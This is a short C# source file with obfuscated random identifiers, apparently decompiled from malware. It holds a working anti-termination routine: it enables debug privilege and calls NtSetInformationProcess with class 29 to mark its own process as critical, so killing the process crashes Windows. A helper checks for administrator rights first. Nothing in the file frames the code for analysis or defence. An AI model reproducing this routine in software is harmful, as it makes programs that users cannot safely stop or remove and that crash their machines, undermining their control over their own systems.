using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace HuHbCLeSgdQqCa;

public static class OGVgHuCHGGzhtV
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

	public static void DJXiJOyjjIqeW()
	{
		int int_ = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_, 4);
	}

	public static bool LpXYEtDRdtVA()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
